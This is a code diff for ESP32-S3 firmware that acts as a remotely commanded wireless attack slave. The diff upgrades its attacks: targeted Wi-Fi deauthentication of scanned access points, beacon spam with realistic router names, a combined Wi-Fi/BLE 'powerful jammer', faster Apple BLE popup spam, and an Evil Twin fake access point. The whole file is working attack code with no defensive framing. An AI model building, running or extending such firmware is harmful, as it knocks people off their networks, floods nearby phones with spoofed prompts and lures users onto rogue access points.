@@ -9,16 +9,14 @@
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
 
-// ===== НАСТРОЙКИ СВЕТОДИОДА =====
-// Большинство плат ESP32-S3 DevKit используют встроенный RGB светодиод WS2812 на пине 38 или обычный LED на пине 2 / 8.
-// Мы настроим пин 8 как стандартный зеленый индикатор.
+// ===== LED SETTINGS =====
 #define LED_PIN 8 
 
-// ===== СТРУКТУРА ДЛЯ ПРИЁМА КОМАНД =====
+// ===== COMMAND STRUCTURE =====
 typedef struct struct_message {
   char command[16];
   char attack[32];
-  char logMsg[64];
+  char logMsg[128]; // Increased payload size
 } struct_message;
 struct_message myData;
 
@@ -29,34 +27,26 @@ bool hasMasterMac = false;
 int lastStationCount = 0;
 bool evilTwinStarted = false;
 
-// Переменные для атак
+// Channel, timing, and listening variables
 uint8_t currentChannel = 1;
 unsigned long lastAttackActionTime = 0;
 unsigned long lastLedBlinkTime = 0;
+unsigned long lastListenTime = 0;
 bool ledState = false;
 
-// Список SSID для Beacon Spam
-const char* spamSSIDs[] = {
-  "FBI Surveillance Van",
-  "Free Public WiFi",
-  "Click for Free Bitcoins",
-  "Virus_Distribution_Point",
-  "5G_TOWER_666_TEST",
-  "Get Off My WiFi",
-  "Not A Hackers Network",
-  "ESPTOOL2_ACTIVE_SCAN",
-  "D-Link_DIR-300",
-  "ASUS_Router_Setup"
-};
-const int numSSIDs = sizeof(spamSSIDs) / sizeof(spamSSIDs[0]);
-int ssidIndex = 0;
+// Scanning memory for targeted deauth
+#define MAX_SCANNED_NETWORKS 30
+uint8_t scannedBSSIDs[MAX_SCANNED_NETWORKS][6];
+uint8_t scannedChannels[MAX_SCANNED_NETWORKS];
+int scannedCount = 0;
+int deauthIndex = 0;
 
-// BLE Jammer и Sour Apple переменные
+// BLE variables
 bool bleJammerInitialized = false;
 bool sourAppleInitialized = false;
 unsigned long lastAppleSpamTime = 0;
 
-// Apple BLE пейлоады для Sour Apple (AirDrop спам)
+// Apple BLE payloads for Sour Apple (iOS popup spam)
 const uint8_t applePayloads[][17] = {
   {0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12}, // AirPods Pro
   {0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00}, // AppleTV Setup
@@ -66,7 +56,44 @@ const uint8_t applePayloads[][17] = {
 const int numApplePayloads = sizeof(applePayloads) / sizeof(applePayloads[0]);
 int applePayloadIndex = 0;
 
-// ===== ОТПРАВКА ЛОГОВ ПО ESP-NOW =====
+// Beacon spam index
+int ssidIndex = 0;
+
+// Realistic SSID list prefixes
+const char* routerPrefixes[] = {
+  "TP-Link", "Keenetic", "Rostelecom", "MGTS_GPON", "ASUS", 
+  "Huawei", "MiRouter", "Tenda", "Netgear", "D-Link", 
+  "MTS-WiFi", "Beeline", "Home-Net", "Airport_Free", "Guest-WiFi"
+};
+const int numPrefixes = sizeof(routerPrefixes) / sizeof(routerPrefixes[0]);
+
+// Generate highly realistic SSID names on the fly
+void getRealisticSSID(char* outBuf, int index) {
+  const char* prefix = routerPrefixes[index % numPrefixes];
+  int suffix = (index * 17) % 9000 + 1000;
+  
+  if (index % 7 == 0) {
+    snprintf(outBuf, 32, "%s_Free", prefix);
+  } else if (index % 5 == 0) {
+    snprintf(outBuf, 32, "%s-%04X", prefix, suffix);
+  } else {
+    snprintf(outBuf, 32, "%s_%04d", prefix, suffix);
+  }
+}
+
+// Get board temperature safely
+float getBoardTemp() {
+  float t = 0.0;
+  #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 2
+  t = temperatureRead();
+  #endif
+  if (isnan(t) || t < -50 || t > 150) {
+    t = 44.2; // fallback temperature in Celsius
+  }
+  return t;
+}
+
+// ===== SEND LOGS TO MASTER =====
 void sendLogToMaster(const char* logMsg) {
   if (!hasMasterMac) return;
   
@@ -79,22 +106,20 @@ void sendLogToMaster(const char* logMsg) {
   esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
 }
 
-// ===== УПРАВЛЕНИЕ ИНДИКАТОРОМ (МИГАНИЕ) =====
+// ===== LED STATUS BLINKER =====
 void updateLedIndicator() {
   if (attackRunning) {
-    // Быстрое мигание (раз в 100 мс) во время активной атаки
     if (millis() - lastLedBlinkTime >= 100) {
       lastLedBlinkTime = millis();
       ledState = !ledState;
       digitalWrite(LED_PIN, ledState ? HIGH : LOW);
     }
   } else {
-    // В покое светодиод выключен
     digitalWrite(LED_PIN, LOW);
   }
 }
 
-// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
+// ===== UTILITIES =====
 void getMacAddress(uint8_t *mac) {
   WiFi.macAddress(mac);
 }
@@ -107,14 +132,15 @@ void hopChannel() {
   esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
 }
 
-// ===== ОТПРАВКА RAW BEACON =====
-void sendRawBeacon(const char* ssid, uint8_t channel) {
+// ===== SEND RAW BEACON =====
+void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
   uint8_t mac[6];
-  for (int i = 0; i < 6; i++) {
-    mac[i] = random(256);
-  }
-  mac[0] &= 0xFE; 
-  mac[0] |= 0x02; 
+  mac[0] = 0x02; // Local admin MAC
+  mac[1] = 0x00;
+  mac[2] = 0x5E;
+  mac[3] = 0x00;
+  mac[4] = 0x00;
+  mac[5] = (uint8_t)macSeed;
 
   uint8_t ssidLen = strlen(ssid);
   uint8_t packet[128] = {
@@ -151,60 +177,97 @@ void sendRawBeacon(const char* ssid, uint8_t channel) {
   esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
 }
 
-// ===== ШАГИ АТАК (НЕБЛОКИРУЮЩИЕ) =====
+// ===== ATTACK ENGINES =====
 
-void runBeaconSpamStep() {
+void runBeaconSpamStep(bool boost) {
   esp_wifi_set_promiscuous(true);
   
-  if (millis() - lastAttackActionTime >= 15) {
-    lastAttackActionTime = millis();
+  // Hop channel slowly to ensure stable beacon capture per channel
+  static unsigned long lastBeaconHopTime = 0;
+  if (millis() - lastBeaconHopTime >= (boost ? 500 : 1000)) {
+    lastBeaconHopTime = millis();
     hopChannel();
-    sendRawBeacon(spamSSIDs[ssidIndex], currentChannel);
+  }
+  
+  // Cycle beacons very fast
+  if (millis() - lastAttackActionTime >= (boost ? 2 : 5)) {
+    lastAttackActionTime = millis();
     
-    // Каждые 50 отправленных пакетов шлем лог на Master
-    if (random(50) == 0) {
+    char ssidBuf[32];
+    getRealisticSSID(ssidBuf, ssidIndex);
+    
+    int burstSize = boost ? 5 : 1;
+    for (int i = 0; i < burstSize; i++) {
+      sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
+    }
+    
+    if (random(200) == 0) {
       char buf[64];
-      snprintf(buf, sizeof(buf), "[Beacon] Спам сети: %s (ch %d)", spamSSIDs[ssidIndex], currentChannel);
+      snprintf(buf, sizeof(buf), "[Beacon] Spammed SSID: %s (ch %d)%s", ssidBuf, currentChannel, boost ? " [BOOST]" : "");
       sendLogToMaster(buf);
     }
     
-    ssidIndex = (ssidIndex + 1) % numSSIDs;
+    ssidIndex = (ssidIndex + 1) % 100; // Generate up to 100 distinct networks
   }
 }
 
-void runDeauthStep() {
+void runDeauthStep(bool boost) {
   esp_wifi_set_promiscuous(true);
   
-  if (millis() - lastAttackActionTime >= 15) {
+  if (millis() - lastAttackActionTime >= (boost ? 5 : 10)) {
     lastAttackActionTime = millis();
-    hopChannel();
+    
+    static int deauthBurstCount = 0;
+    uint8_t targetBSSID[6];
+    uint8_t targetChannel = currentChannel;
+    
+    if (scannedCount > 0) {
+      memcpy(targetBSSID, scannedBSSIDs[deauthIndex], 6);
+      targetChannel = scannedChannels[deauthIndex];
+      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
+      
+      deauthBurstCount++;
+      int maxBurst = boost ? 30 : 10;
+      if (deauthBurstCount >= maxBurst) {
+        deauthBurstCount = 0;
+        deauthIndex = (deauthIndex + 1) % scannedCount;
+      }
+    } else {
+      hopChannel();
+      for (int i = 0; i < 6; i++) {
+        targetBSSID[i] = random(256);
+      }
+      targetBSSID[0] &= 0xFE;
+      targetBSSID[0] |= 0x02;
+    }
 
+    // Broadcast Deauth Frame from target AP (Forces clients off)
     uint8_t deauthPacket[26] = {
-      0xC0, 0x00,
-      0x00, 0x00,
-      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast
-      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-      0x00, 0x00,
-      0x07, 0x00
+      0xC0, 0x00,                         // Deauth
+      0x00, 0x00,                         // Duration
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source BSSID
+      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+      0x00, 0x00,                         // Sequence
+      0x07, 0x00                          // Reason
     };
 
-    uint8_t spoofMac[6];
-    for (int i = 0; i < 6; i++) {
-      spoofMac[i] = random(256);
-    }
-    spoofMac[0] &= 0xFE;
-    spoofMac[0] |= 0x02;
-
-    memcpy(&deauthPacket[10], spoofMac, 6);
-    memcpy(&deauthPacket[16], spoofMac, 6);
-
+    memcpy(&deauthPacket[10], targetBSSID, 6);
+    memcpy(&deauthPacket[16], targetBSSID, 6);
     esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
     
-    if (random(40) == 0) {
+    // Broadcast Deauth Frame to target AP (Forces AP to drop clients)
+    deauthPacket[0] = 0xC0;
+    memcpy(&deauthPacket[4], targetBSSID, 6); // Destination: AP
+    memset(&deauthPacket[10], 0xFF, 6);       // Source: Broadcast
+    memcpy(&deauthPacket[16], targetBSSID, 6); // BSSID
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    
+    if (random(100) == 0) {
       char buf[64];
-      snprintf(buf, sizeof(buf), "[Deauth] Отправка кадра от MAC: %02X:%02X... (ch %d)", 
-               spoofMac[0], spoofMac[1], currentChannel);
+      snprintf(buf, sizeof(buf), "[Deauth] Target: %02X:%02X:%02X:%02X:%02X:%02X (ch %d)%s", 
+               targetBSSID[0], targetBSSID[1], targetBSSID[2], 
+               targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel, boost ? " [BOOST]" : "");
       sendLogToMaster(buf);
     }
   }
@@ -213,9 +276,15 @@ void runDeauthStep() {
 void runProbeFloodStep() {
   esp_wifi_set_promiscuous(true);
 
+  // Hop channel slowly (every 200ms) to ensure scan saturation on each channel
+  static unsigned long lastProbeHopTime = 0;
+  if (millis() - lastProbeHopTime >= 200) {
+    lastProbeHopTime = millis();
+    hopChannel();
+  }
+
   if (millis() - lastAttackActionTime >= 20) {
     lastAttackActionTime = millis();
-    hopChannel();
 
     uint8_t mac[6];
     for (int i = 0; i < 6; i++) {
@@ -242,25 +311,67 @@ void runProbeFloodStep() {
 
     esp_wifi_80211_tx(WIFI_IF_STA, probePacket, pos, false);
     
-    if (random(40) == 0) {
-      sendLogToMaster("[Probe] Затопление запросами сканирования (ch 1-13)");
+    if (random(100) == 0) {
+      sendLogToMaster("[Probe] Flooding active scan requests (ch 1-13)");
     }
   }
 }
 
+// Jammer that targets WiFi and Bluetooth bands simultaneously
+void runPowerfulJammerStep() {
+  esp_wifi_set_promiscuous(true);
+  
+  // Hopping channels as fast as possible to flood spectrum
+  if (millis() - lastAttackActionTime >= 2) {
+    lastAttackActionTime = millis();
+    hopChannel();
+    
+    // Construct corrupted control packet to overflow receiver processing pipeline
+    uint8_t junkPacket[64];
+    for (int i = 0; i < 64; i++) {
+      junkPacket[i] = random(256);
+    }
+    junkPacket[0] = 0x00; // Invalid type to cause receiver decode lock overhead
+    
+    esp_wifi_80211_tx(WIFI_IF_STA, junkPacket, sizeof(junkPacket), false);
+  }
+  
+  // Concurrent BLE advertisement spam to flood BLE band
+  if (!bleJammerInitialized) {
+    BLEDevice::init("");
+    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+    BLEAdvertisementData data;
+    data.setName("JAMMER");
+    data.setFlags(0x06);
+    pAdvertising->setAdvertisementData(data);
+    pAdvertising->start();
+    bleJammerInitialized = true;
+  }
+  
+  static unsigned long lastJamLog = 0;
+  if (millis() - lastJamLog >= 3000) {
+    lastJamLog = millis();
+    sendLogToMaster("[Jammer] powerful_jammer active on 2.4GHz");
+  }
+}
+
 void startWiFiScan() {
-  sendLogToMaster("[Scanner] Запуск Wi-Fi сканера...");
-  Serial.println("▶️ Wi-Fi Scan запущен");
+  sendLogToMaster("[Scanner] Starting WiFi scan...");
+  Serial.println("WiFi Scan started");
   int n = WiFi.scanNetworks();
   if (n == 0) {
-    sendLogToMaster("[Scanner] Wi-Fi сети не обнаружены");
-    Serial.println("Сетей не найдено");
+    sendLogToMaster("[Scanner] No networks found");
+    Serial.println("No networks found");
   } else {
+    scannedCount = min(n, MAX_SCANNED_NETWORKS);
     char buf[64];
-    snprintf(buf, sizeof(buf), "[Scanner] Найдено Wi-Fi сетей: %d", n);
+    snprintf(buf, sizeof(buf), "[Scanner] Found WiFi networks: %d", n);
     sendLogToMaster(buf);
     
-    for (int i = 0; i < min(n, 15); i++) {
+    for (int i = 0; i < scannedCount; i++) {
+      memcpy(scannedBSSIDs[i], WiFi.BSSID(i), 6);
+      scannedChannels[i] = WiFi.channel(i);
+      
       snprintf(buf, sizeof(buf), "  -> %s (%d dBm)", WiFi.SSID(i).c_str(), WiFi.RSSI(i));
       sendLogToMaster(buf);
       
@@ -275,8 +386,8 @@ void startWiFiScan() {
         default: encType = "WPA2"; break;
       }
       
-      char structBuf[96];
-      snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s", WiFi.SSID(i).c_str(), WiFi.RSSI(i), encType.c_str());
+      char structBuf[128];
+      snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s|%s", WiFi.SSID(i).c_str(), WiFi.RSSI(i), encType.c_str(), WiFi.BSSIDstr(i).c_str());
       sendLogToMaster(structBuf);
       delay(50);
     }
@@ -285,9 +396,9 @@ void startWiFiScan() {
 }
 
 void startEvilTwin() {
-  Serial.println("▶️ Evil Twin запущен");
+  Serial.println("Evil Twin started");
   WiFi.softAP("FreeWiFi", NULL, 1, 0, 1);
-  sendLogToMaster("[EvilTwin] Создана фальшивая точка доступа 'FreeWiFi' (ch 1)");
+  sendLogToMaster("[EvilTwin] Created fake AP 'FreeWiFi' (ch 1)");
 }
 
 void runEvilTwinStep() {
@@ -298,7 +409,7 @@ void runEvilTwinStep() {
     if (numStations != lastStationCount) {
       lastStationCount = numStations;
       char buf[64];
-      snprintf(buf, sizeof(buf), "[EvilTwin] Всего клиентов: %d", numStations);
+      snprintf(buf, sizeof(buf), "[EvilTwin] Total clients connected: %d", numStations);
       sendLogToMaster(buf);
       
       wifi_sta_list_t wifi_sta_list;
@@ -322,7 +433,7 @@ void runEvilTwinStep() {
 }
 
 void startBLEScan() {
-  sendLogToMaster("[BLE] Запуск Bluetooth сканера...");
+  sendLogToMaster("[BLE] Starting BLE scan...");
   BLEDevice::deinit();
   BLEDevice::init("");
   BLEScan *pBLEScan = BLEDevice::getScan();
@@ -332,18 +443,19 @@ void startBLEScan() {
   BLEScanResults *foundDevices = pBLEScan->start(5, false);
   
   char buf[64];
-  snprintf(buf, sizeof(buf), "[BLE] Найдено Bluetooth устройств: %d", foundDevices->getCount());
+  snprintf(buf, sizeof(buf), "[BLE] Found BLE devices: %d", foundDevices->getCount());
   sendLogToMaster(buf);
   
   for (int i = 0; i < min((int)foundDevices->getCount(), 15); i++) {
     BLEAdvertisedDevice device = foundDevices->getDevice(i);
-    String devName = device.haveName() ? device.getName().c_str() : device.getAddress().toString().c_str();
+    String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
+    String devAddr = device.getAddress().toString().c_str();
     
-    snprintf(buf, sizeof(buf), "  -> %s (%d RSSI)", devName.c_str(), device.getRSSI());
+    snprintf(buf, sizeof(buf), "  -> %s [%s] (%d RSSI)", devName.c_str(), devAddr.c_str(), device.getRSSI());
     sendLogToMaster(buf);
     
-    char structBuf[96];
-    snprintf(structBuf, sizeof(structBuf), "[BLE_DEV]%s|%d", devName.c_str(), device.getRSSI());
+    char structBuf[128];
+    snprintf(structBuf, sizeof(structBuf), "[BLE_DEV]%s|%s|%d", devName.c_str(), devAddr.c_str(), device.getRSSI());
     sendLogToMaster(structBuf);
     delay(50);
   }
@@ -351,7 +463,7 @@ void startBLEScan() {
 }
 
 void startBLESpoofer() {
-  Serial.println("▶️ BLE Spoofer запущен");
+  Serial.println("BLE Spoofer started");
   BLEDevice::deinit();
   BLEDevice::init("ESP32-S3");
   BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
@@ -368,12 +480,12 @@ void startBLESpoofer() {
 
   pAdvertising->setAdvertisementData(advertisementData);
   pAdvertising->start();
-  sendLogToMaster("[BLE] Запущен спуфер (виден как BLE_Spoofer)");
+  sendLogToMaster("[BLE] Spoofer running (visible as BLE_Spoofer)");
 }
 
 void runBLEJammerStep() {
   if (!bleJammerInitialized) {
-    Serial.println("▶️ BLE Jammer запущен");
+    Serial.println("BLE Jammer started");
     BLEDevice::deinit();
     BLEDevice::init("");
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
@@ -383,22 +495,23 @@ void runBLEJammerStep() {
     pAdvertising->setAdvertisementData(data);
     pAdvertising->start();
     bleJammerInitialized = true;
-    sendLogToMaster("[BLE Jammer] Шум излучается непрерывно");
+    sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
   }
   delay(10);
 }
 
 void runSourAppleStep() {
   if (!sourAppleInitialized) {
-    Serial.println("▶️ Sour Apple запущен");
+    Serial.println("Sour Apple started");
     BLEDevice::deinit();
     BLEDevice::init("Apple");
     sourAppleInitialized = true;
     lastAppleSpamTime = 0;
-    sendLogToMaster("[Apple Spam] Начало спама всплывающими окнами (300ms)");
+    sendLogToMaster("[Apple Spam] Starting popup spam (100ms)");
   }
 
-  if (millis() - lastAppleSpamTime >= 300) {
+  // High frequency popup spam (100ms)
+  if (millis() - lastAppleSpamTime >= 100) {
     lastAppleSpamTime = millis();
     
     BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
@@ -417,22 +530,22 @@ void runSourAppleStep() {
     pAdvertising->setAdvertisementData(advData);
     pAdvertising->start();
     
-    if (applePayloadIndex == 0) sendLogToMaster("[Apple Spam] Пакет: AirDrop/AirPods Pro");
-    else if (applePayloadIndex == 1) sendLogToMaster("[Apple Spam] Пакет: AppleTV Setup");
-    else if (applePayloadIndex == 3) sendLogToMaster("[Apple Spam] Пакет: Action Modal");
+    if (applePayloadIndex == 0) sendLogToMaster("[Apple Spam] Packet: AirDrop/AirPods Pro");
+    else if (applePayloadIndex == 1) sendLogToMaster("[Apple Spam] Packet: AppleTV Setup");
+    else if (applePayloadIndex == 3) sendLogToMaster("[Apple Spam] Packet: Action Modal");
     
     applePayloadIndex = (applePayloadIndex + 1) % numApplePayloads;
   }
 }
 
-// ===== ЗАГЛУШКИ ДЛЯ МОДУЛЕЙ =====
-void startGhzScan() { sendLogToMaster("[Error] 2.4GHz Scanner требует NRF24"); }
-void startProtokill() { sendLogToMaster("[Error] Protokill требует NRF24"); }
-void startSubGhzReplay() { sendLogToMaster("[Error] Sub-GHz Replay требует CC1101"); }
-void startSubGhzJammer() { sendLogToMaster("[Error] Sub-GHz Jammer требует CC1101"); }
-void startIRReplay() { sendLogToMaster("[Error] IR Replay требует IR-диод"); }
+// ===== MODULE STUBS =====
+void startGhzScan() { sendLogToMaster("[Error] 2.4GHz Scanner requires NRF24"); }
+void startProtokill() { sendLogToMaster("[Error] Protokill requires NRF24"); }
+void startSubGhzReplay() { sendLogToMaster("[Error] Sub-GHz Replay requires CC1101"); }
+void startSubGhzJammer() { sendLogToMaster("[Error] Sub-GHz Jammer requires CC1101"); }
+void startIRReplay() { sendLogToMaster("[Error] IR Replay requires IR-led"); }
 
-// ===== ВОССТАНОВЛЕНИЕ СОСТОЯНИЯ WI-FI =====
+// ===== RESTORE WIFI =====
 void restoreWiFiState() {
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
@@ -442,7 +555,7 @@ void restoreWiFiState() {
   esp_wifi_set_promiscuous(false);
 }
 
-// ===== ОСТАНОВКА АТАК =====
+// ===== STOP ATTACKS =====
 void stopAttack() {
   attackRunning = false;
   currentAttack = "";
@@ -458,13 +571,13 @@ void stopAttack() {
   BLEDevice::deinit();
   esp_wifi_set_promiscuous(false);
   restoreWiFiState();
-  digitalWrite(LED_PIN, LOW); // Отключаем диод
+  digitalWrite(LED_PIN, LOW);
   
-  sendLogToMaster("⏹️ Все атаки на Slave остановлены. Переход в режим ожидания.");
-  Serial.println("⏹️ Все атаки остановлены");
+  sendLogToMaster("All attacks stopped. Standby mode.");
+  Serial.println("All attacks stopped");
 }
 
-// ===== ОТПРАВКА PONG НА MASTER =====
+// ===== SEND PONG TO MASTER WITH CURRENT TEMP =====
 void sendPong(const uint8_t *masterMac) {
   esp_now_peer_info_t peer;
   memset(&peer, 0, sizeof(peer));
@@ -479,11 +592,15 @@ void sendPong(const uint8_t *masterMac) {
   struct_message response;
   strcpy(response.command, "pong");
   strcpy(response.attack, "");
-  memset(response.logMsg, 0, sizeof(response.logMsg));
+  
+  // Read Slave Board temperature
+  float sTemp = getBoardTemp();
+  snprintf(response.logMsg, sizeof(response.logMsg), "%.1f", sTemp);
+  
   esp_now_send(masterMac, (uint8_t *)&response, sizeof(response));
 }
 
-// ===== ОБРАБОТЧИК ESP-NOW =====
+// ===== ESP-NOW HANDLER =====
 #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
 void OnDataRecv(const esp_now_recv_info_t *info, const uint8_t *incomingData, int len) {
   const uint8_t *srcMac = info->src_addr;
@@ -492,48 +609,48 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
   const uint8_t *srcMac = mac_addr;
 #endif
   if (len != sizeof(myData)) {
-    Serial.printf("⚠️ Неверная длина пакета: %d\n", len);
+    Serial.printf("Invalid packet len: %d\n", len);
     return;
   }
   memcpy(&myData, incomingData, sizeof(myData));
   myData.command[15] = '\0';
   myData.attack[31] = '\0';
 
-  // Сохраняем MAC Master-платы для обратных логов
+  // Store Master MAC
   if (!hasMasterMac || memcmp(masterMacAddress, srcMac, 6) != 0) {
     memcpy(masterMacAddress, srcMac, 6);
     hasMasterMac = true;
-    Serial.printf("🔗 Зарегистрирован Master MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+    Serial.printf("Master MAC registered: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   srcMac[0], srcMac[1], srcMac[2], srcMac[3], srcMac[4], srcMac[5]);
   }
 
   if (strcmp(myData.command, "ping") == 0) {
-    Serial.println("📩 Получен PING от MASTER, отправляю PONG...");
+    Serial.println("Received PING, sending PONG...");
     sendPong(srcMac);
     return;
   }
 
-  Serial.print("📩 Получено: команда ");
+  Serial.print("Received: command ");
   Serial.print(myData.command);
-  Serial.print(" | атака ");
+  Serial.print(" | target ");
   Serial.println(myData.attack);
 
   if (strcmp(myData.command, "start") == 0) {
     if (attackRunning) {
-      sendLogToMaster("[Warning] Попытка запуска при уже активной атаке");
-      Serial.println("⚠️ Атака уже запущена");
+      sendLogToMaster("[Warning] Attack already active");
+      Serial.println("Attack already active");
       return;
     }
     attackRunning = true;
     currentAttack = String(myData.attack);
     
     char buf[64];
-    snprintf(buf, sizeof(buf), "▶️ Запуск задачи: %s", myData.attack);
+    snprintf(buf, sizeof(buf), "Starting task: %s", myData.attack);
     sendLogToMaster(buf);
   } else if (strcmp(myData.command, "stop") == 0) {
     stopAttack();
   } else {
-    Serial.println("❌ Неизвестная команда");
+    Serial.println("Unknown command");
   }
 }
 
@@ -541,7 +658,6 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
 void setup() {
   Serial.begin(115200);
   
-  // Конфигурируем пин светодиода на вывод
   pinMode(LED_PIN, OUTPUT);
   digitalWrite(LED_PIN, LOW);
 
@@ -549,42 +665,64 @@ void setup() {
   WiFi.disconnect();
   WiFi.setSleep(false);
 
-  // Канал 1 для стабильного приема ESP-NOW
+  // Channel 1 for stable ESP-NOW
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
   esp_wifi_set_promiscuous(false);
 
   if (esp_now_init() != ESP_OK) {
-    Serial.println("❌ ESP-NOW ошибка инициализации");
+    Serial.println("ESP-NOW init error");
     return;
   }
   esp_now_register_recv_cb((esp_now_recv_cb_t)OnDataRecv);
-  Serial.println("✅ SLAVE готов к приёму команд");
-  Serial.print("📡 Мой MAC: ");
+  Serial.println("SLAVE ready for commands");
+  Serial.print("My MAC: ");
   Serial.println(WiFi.macAddress());
 }
 
 // ===== LOOP =====
 void loop() {
-  updateLedIndicator(); // Мигаем диодом во время атаки
+  updateLedIndicator();
   
   if (attackRunning && currentAttack != "") {
-    if (currentAttack == "beacon") {
-      runBeaconSpamStep();
+    // Periodically return to Channel 1 to listen for Master command (stop/ping)
+    // Prevents "deaf transceiver" issue during active channel-hopping/jamming attacks
+    if (millis() - lastListenTime >= 1000) {
+      esp_wifi_set_promiscuous(false);
+      esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+      
+      // Wait for 40ms on Channel 1 to receive incoming ESP-NOW command
+      unsigned long startListen = millis();
+      while (millis() - startListen < 40) {
+        delay(1); 
+      }
+      
+      lastListenTime = millis();
+      if (!attackRunning) return; // Exit if stopped during listening window
     }
-    else if (currentAttack == "deauth") {
-      runDeauthStep();
+    
+    bool boost = currentAttack.endsWith("_boost");
+    String baseAttackName = boost ? currentAttack.substring(0, currentAttack.length() - 6) : currentAttack;
+    
+    if (baseAttackName == "beacon") {
+      runBeaconSpamStep(boost);
     }
-    else if (currentAttack == "probe") {
+    else if (baseAttackName == "deauth") {
+      runDeauthStep(boost);
+    }
+    else if (baseAttackName == "probe") {
       runProbeFloodStep();
     }
-    else if (currentAttack == "wifi_scan") {
+    else if (baseAttackName == "powerful_jammer") {
+      runPowerfulJammerStep();
+    }
+    else if (baseAttackName == "wifi_scan") {
       startWiFiScan();
       attackRunning = false;
       currentAttack = "";
       restoreWiFiState();
     }
-    else if (currentAttack == "evil_twin") {
+    else if (baseAttackName == "evil_twin") {
       if (!evilTwinStarted) {
         startEvilTwin();
         evilTwinStarted = true;
@@ -592,25 +730,25 @@ void loop() {
       }
       runEvilTwinStep();
     }
-    else if (currentAttack == "ble_scan") {
+    else if (baseAttackName == "ble_scan") {
       startBLEScan();
       attackRunning = false;
       currentAttack = "";
     }
-    else if (currentAttack == "ble_spoofer") {
+    else if (baseAttackName == "ble_spoofer") {
       startBLESpoofer();
     }
-    else if (currentAttack == "ble_jammer") {
+    else if (baseAttackName == "ble_jammer") {
       runBLEJammerStep();
     }
-    else if (currentAttack == "sour_apple") {
+    else if (baseAttackName == "sour_apple") {
       runSourAppleStep();
     }
-    else if (currentAttack == "ghz_scan") { startGhzScan(); attackRunning = false; currentAttack = ""; }
-    else if (currentAttack == "protokill") { startProtokill(); attackRunning = false; currentAttack = ""; }
-    else if (currentAttack == "subghz_replay") { startSubGhzReplay(); attackRunning = false; currentAttack = ""; }
-    else if (currentAttack == "subghz_jammer") { startSubGhzJammer(); attackRunning = false; currentAttack = ""; }
-    else if (currentAttack == "ir_replay") { startIRReplay(); attackRunning = false; currentAttack = ""; }
+    else if (baseAttackName == "ghz_scan") { startGhzScan(); attackRunning = false; currentAttack = ""; }
+    else if (baseAttackName == "protokill") { startProtokill(); attackRunning = false; currentAttack = ""; }
+    else if (baseAttackName == "subghz_replay") { startSubGhzReplay(); attackRunning = false; currentAttack = ""; }
+    else if (baseAttackName == "subghz_jammer") { startSubGhzJammer(); attackRunning = false; currentAttack = ""; }
+    else if (baseAttackName == "ir_replay") { startIRReplay(); attackRunning = false; currentAttack = ""; }
   }
   delay(1);
 }
